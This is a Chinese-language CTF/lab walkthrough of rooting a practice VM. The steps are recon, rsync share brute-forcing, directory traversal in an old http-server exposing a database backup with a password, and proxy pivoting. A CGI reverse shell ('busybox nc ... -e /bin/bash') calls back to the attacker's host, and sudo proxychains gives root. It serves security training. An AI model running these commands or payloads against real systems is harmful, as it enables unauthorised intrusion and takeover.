# 一、信息收集

## 1.1 主机发现

使用 arp-scan 进行局域网主机扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.189 08:00:27:c4:3a:e0       PCS Systemtechnik GmbH
...
```

发现目标主机 IP 为 `192.168.205.189`。

## 1.2 端口扫描

对目标进行全端口扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.189
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-13 10:09 CST
Nmap scan report for 192.168.205.189
Host is up (0.00021s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
873/tcp  open  rsync
3128/tcp open  squid-http
8080/tcp open  http-proxy
...
```

发现开放端口：

- **22/tcp** - SSH 服务
- **80/tcp** - HTTP 服务
- **873/tcp** - Rsync 服务
- **3128/tcp** - Squid HTTP 代理
- **8080/tcp** - HTTP 代理服务

# 二、服务枚举

## 2.1 Rsync 服务探测

尝试列出 rsync 共享目录：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ rsync -av --list-only rsync://192.168.205.189
```

无法直接获取目录列表。群主通过字典爆破发现了共享名：

![image-20250913101134146](http://7r1UMPHK.github.io/image/20250913111727187.webp)

```bash
for i in $(cat /usr/share/seclists/Discovery/Web-Content/common.txt);do 
    echo $i
    rsync -av --list-only rsync://192.168.205.189/$i 2>&1|grep -Piv 'error'|grep .
done
```

发现存在 `_dev` 共享目录，但需要身份验证。群主尝试密码爆破但没有成功。

![image-20250913101313414](http://7r1UMPHK.github.io/image/20250913111724416.webp)

## 2.2 HTTP 服务 (8080端口)

该端口运行的是 static HTTP server。HYH 大佬发现其使用的是 [http-party/http-server](https://github.com/http-party/http-server)，版本较老（2022年）。

目录爆破结果：

```bash
200      GET      368l      933w    10701c http://192.168.205.189/
200      GET      368l      933w    10701c http://192.168.205.189/index.html
301      GET        9l       28w      323c http://192.168.205.189/javascript => http://192.168.205.189/javascript/
...
```

初步扫描没有发现有价值的信息。

## 2.3 Squid 代理服务

尝试使用代理时提示需要身份验证。通过构造特定响应可以爆破用户名（暂时没用搁置）：

```bash
resp=$(curl -U "$usr:1" -x "$proxy" "$target" 2>/dev/null)
if [[ "$resp" != *"No%20such%20user"* ]]; then
    # 用户存在
fi
```

此时 Fzer0FA、HYH、Aristore 等多位大佬也在尝试图片隐写等其他方向。

# 三、漏洞利用

## 3.1 http-server 目录遍历漏洞

经过研究发现 http-party/http-server 存在目录遍历漏洞。参考：[Multiple vulnerabilities in Node.js ecstatic/http-server](https://tripla.dk/2020/03/26/multiple-vulnerabilities-in-nodejs-ecstatic-http-server-http-party/)

![image-20250913102353524](http://7r1UMPHK.github.io/image/20250913111725055.webp)

利用漏洞进行目录遍历：

![image-20250913102558551](http://7r1UMPHK.github.io/image/20250913111727174.webp)

成功获取上级目录列表，发现 `bak2025` 目录，其中包含数据库备份文件 `backup2025-09-10.sql`。

## 3.2 数据库凭据提取

下载并分析数据库备份：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ wget http://192.168.205.189:8080/bak2025/backup2025-09-10.sql
...

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ sqlite3 backup2025-09-10.sql
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> select * from users;
1|dev|null
2|admin|null
3|proxy|Pr0xyH@sTh3P0w3r
4|haris|null
```

获得凭据：`proxy:Pr0xyH@sTh3P0w3r`

# 四、权限获取

## 4.1 测试凭据

SSH 登录失败，但 rsync 验证成功：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ rsync -av --list-only rsync://proxy@192.168.205.189/_dev
Password: 
receiving incremental file list
drwxr-xr-x          4,096 2025/09/11 14:25:22 .
...
```

目录为空，但可以上传文件。

## 4.2 内网服务探测

使用获得的凭据通过 Squid 代理访问内网：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl -U proxy:Pr0xyH@sTh3P0w3r -x http://192.168.205.189:3128 http://127.0.0.1:8080
<html>
  <head>
    <title>node.js http server</title>
  </head>
  ...
</html>
```

扫描内网端口：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ seq 1 65535 | xargs -P 50 -I {} sh -c 'curl -U proxy:Pr0xyH@sTh3P0w3r -x http://192.168.205.189:3128 http://127.0.0.1:{} -s -o /dev/null -w "%{http_code} {}\n" -m 1 2>/dev/null | grep "^200" | cut -d" " -f2'
80
8000
8080
```

发现 8000 端口：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl -U proxy:Pr0xyH@sTh3P0w3r -x http://192.168.205.189:3128 http://127.0.0.1:8000
<html>
  <head>
    <title>Internal Server</title>
  </head>
  <body>
    <h1>Internal Server</h1>
    <p>Access to the server is allowed only for authorized developers.</p>
  </body>
</html>
```

## 4.3 CGI 脚本执行

目录爆破发现 `/cgi-bin/` 目录存在且返回 403。

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ dirsearch -u http://127.0.0.1:8000 --proxy http://192.168.205.189:3128 --proxy-auth proxy:Pr0xyH@sTh3P0w3r
...
[10:46:49] 403 -  384B  - /cgi-bin/
[10:46:49] 301 -    0B  - /cgi-bin  ->  /cgi-bin/
...
```

推测 `_dev` 目录可能映射到 CGI 目录。

测试文件上传和访问：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ echo "hello hack" > test

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ rsync test rsync://proxy@192.168.205.189/_dev
Password: 

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl -U proxy:Pr0xyH@sTh3P0w3r -x http://192.168.205.189:3128 http://127.0.0.1:8000/cgi-bin/test -v
...
< HTTP/1.1 200 OK
...
```

返回 200，确认可以执行。上传反弹 shell：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat shell.cgi 
#!/bin/bash
echo "Content-Type: text/html"
echo ""

busybox nc 192.168.205.128 8888 -e /bin/bash

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ rsync shell.cgi rsync://proxy@192.168.205.189/_dev
Password: 
```

监听并触发：

```bash
# 监听端
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
listening on [any] 8888 ...

# 触发端
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl -U proxy:Pr0xyH@sTh3P0w3r -x http://192.168.205.189:3128 http://127.0.0.1:8000/cgi-bin/shell.cgi
```

成功获得 shell：

```bash
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.189] 59038
id
uid=13(proxy) gid=13(proxy) grupos=13(proxy)
```

# 五、权限提升

```
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 36 columns 178
```

稳定 shell 后检查 sudo 权限：

```bash
proxy@static:/usr/bin$ sudo -l
Matching Defaults entries for proxy on static:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User proxy may run the following commands on static:
    (root) NOPASSWD: /usr/bin/proxychains
```

发现可以无密码执行 proxychains，直接利用获取 root：

```bash
proxy@static:/usr/bin$ sudo /usr/bin/proxychains bash
ProxyChains-3.1 (http://proxychains.sf.net)
root@static:/usr/bin# id
uid=0(root) gid=0(root) grupos=0(root)
root@static:/usr/bin# cat /root/root.txt /home/proxy/user.txt 
1ec3b7ffaf9b33e1d09fc1c7046f25b4
fde48ab5f20e345e99d05f73bb929bf4
```

成功获得 root 权限和 flag。